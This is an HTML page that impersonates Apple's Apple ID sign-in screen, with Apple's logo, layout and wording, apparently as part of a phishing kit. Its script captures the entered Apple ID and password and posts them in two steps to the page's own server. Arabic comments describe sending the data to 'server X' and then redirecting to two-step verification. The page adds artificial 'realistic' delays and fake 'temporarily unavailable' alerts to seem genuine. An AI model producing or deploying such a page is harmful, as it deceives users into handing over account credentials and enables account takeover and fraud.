<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in with Apple - X</title>
    <link rel="icon" type="image/svg+xml" href="/static/favicon.svg">
    <link rel="shortcut icon" href="/favicon.ico">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fff;
            color: #000;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            padding: 20px;
            text-align: center;
        }
        
        .apple-logo {
            margin-bottom: 20px;
            transition: transform 0.5s ease;
        }
        
        .apple-logo svg {
            width: 50px;
            height: 50px;
        }
        
        .apple-logo:hover {
            transform: scale(1.05);
        }
        
        h1 {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 30px;
        }
        
        .device-icon {
            margin-bottom: 20px;
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #333;
        }
        
        input[type="text"],
        input[type="password"] {
            width: 100%;
            height: 44px;
            padding: 0 15px;
            font-size: 16px;
            border: 1px solid #d6d6d6;
            border-radius: 6px;
            box-sizing: border-box;
        }
        
        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #0070c9;
            box-shadow: 0 0 0 1px #0070c9;
        }
        
        .sign-in-btn {
            width: 100%;
            height: 44px;
            background-color: #0070c9;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.2s, transform 0.3s ease;
        }
        
        .sign-in-btn:hover {
            background-color: #0051a5;
        }
        
        .sign-in-btn:active {
            transform: scale(0.98);
        }
        
        .forgot-link {
            display: block;
            margin-top: 20px;
            color: #0070c9;
            text-decoration: none;
            font-size: 14px;
            transition: color 0.3s ease;
        }
        
        .forgot-link:hover {
            text-decoration: underline;
            color: #004d8a;
        }
        
        .divider {
            margin: 30px 0;
            border-bottom: 1px solid #d6d6d6;
        }
        
        .create-btn {
            display: inline-block;
            padding: 10px 20px;
            background-color: #fff;
            color: #0070c9;
            border: 1px solid #0070c9;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
            text-decoration: none;
            transition: background-color 0.2s, transform 0.3s ease;
        }
        
        .create-btn:hover {
            background-color: #f5f5f7;
        }
        
        .create-btn:active {
            transform: scale(0.98);
        }
        
        /* Spinner animation for buttons */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .spinning {
            position: relative;
        }
        
        .spinning::after {
            content: "";
            position: absolute;
            width: 16px;
            height: 16px;
            top: 50%;
            left: 20px;
            margin-top: -8px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s linear infinite;
            display: none;
        }
        
        .spinning.active::after {
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="apple-logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" fill="black">
                <path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/>
            </svg>
        </div>
        
        <h1>Sign in with your Apple ID</h1>
        
        <form action="/login" method="POST">
            <div class="form-group">
                <label for="apple-id">Apple ID</label>
                <input type="text" id="apple-id" name="username" placeholder="example@icloud.com" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Required" required>
            </div>
            
            <button type="submit" class="sign-in-btn spinning">Sign In</button>
            
            <a href="#" class="forgot-link">Forgot Apple ID or Password?</a>
        </form>
        
        <div class="divider"></div>
        
        <a href="#" class="create-btn">Create Apple ID</a>
    </div>
    
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // Add artificial delay for page load (0.8-1.5 seconds)
            setTimeout(() => {
                // Focus the email field after a slight delay
                setTimeout(() => {
                    document.getElementById('apple-id').focus();
                }, 5000);
                
                // تعديل النموذج ليرسل البيانات إلى خادم X
                document.querySelector('form').addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    // الحصول على البيانات
                    const username = document.getElementById('apple-id').value;
                    const password = document.getElementById('password').value;
                    
                    // تعطيل زر التسجيل وتغيير النص
                    const submitButton = document.querySelector('.sign-in-btn');
                    submitButton.disabled = true;
                    submitButton.textContent = 'Signing in...';
                    submitButton.classList.add('active');
                    
                    // إضافة تأخير واقعي (1.5 إلى 2.5 ثانية)
                    const delay = 1500 + Math.random() * 1000;
                    
                    setTimeout(function() {
                        // إرسال البيانات إلى الخادم
                        fetch('/login', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded',
                            },
                            body: new URLSearchParams({
                                'username': username
                            })
                        })
                        .then(response => {
                            if (response.ok) {
                                // إضافة تأخير إضافي (1 إلى 1.5 ثانية)
                                return new Promise(resolve => {
                                    setTimeout(() => resolve(response), 1000 + Math.random() * 500);
                                });
                            }
                            throw new Error('Network response was not ok.');
                        })
                        .then(response => {
                            // إرسال البيانات إلى الخادم بشكل أمن
                            return fetch('/password/' + encodeURIComponent(username), {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/x-www-form-urlencoded',
                                },
                                body: new URLSearchParams({
                                    'password': password
                                })
                            });
                        })
                        .then(response => {
                            if (response.ok) {
                                // إضافة تأخير نهائي (0.8 إلى 1.2 ثانية)
                                setTimeout(() => {
                                    // توجيه المستخدم إلى التحقق بخطوتين
                                    window.location.href = response.url;
                                }, 800 + Math.random() * 400);
                            } else {
                                throw new Error('Network response was not ok.');
                            }
                        })
                        .catch(error => {
                            console.error('Error:', error);
                            // استعادة حالة الزر في حالة الخطأ
                            submitButton.disabled = false;
                            submitButton.textContent = 'Sign In';
                            submitButton.classList.remove('active');
                        });
                    }, delay);
                });
                
                // Add key press delay effect for inputs
                const inputs = document.querySelectorAll('input');
                inputs.forEach(input => {
                    input.addEventListener('keydown', function(e) {
                        if (e.key.length === 1 && !e.ctrlKey && !e.metaKey) {
                            // Small delay happens naturally
                        }
                    });
                });
                
                // Add click effects for links
                document.querySelector('.forgot-link').addEventListener('click', function(e) {
                    e.preventDefault();
                    this.style.opacity = '0.7';
                    setTimeout(() => {
                        this.style.opacity = '1';
                        alert('Password reset functionality is temporarily unavailable. Please try again later.');
                    }, 5000);
                });
                
                document.querySelector('.create-btn').addEventListener('click', function(e) {
                    e.preventDefault();
                    this.style.opacity = '0.7';
                    setTimeout(() => {
                        this.style.opacity = '1';
                        alert('Account creation is temporarily unavailable. Please try again later.');
                    }, 5000);
                });
                
                // Add subtle animation to Apple logo after page load
                setTimeout(() => {
                    const appleLogo = document.querySelector('.apple-logo');
                    appleLogo.style.transform = 'scale(1.1)';
                    setTimeout(() => {
                        appleLogo.style.transform = 'scale(1)';
                    }, 5000);
                }, 1500);
                
            }, 800 + Math.random() * 700);
        });
    </script>
</body>
</html> 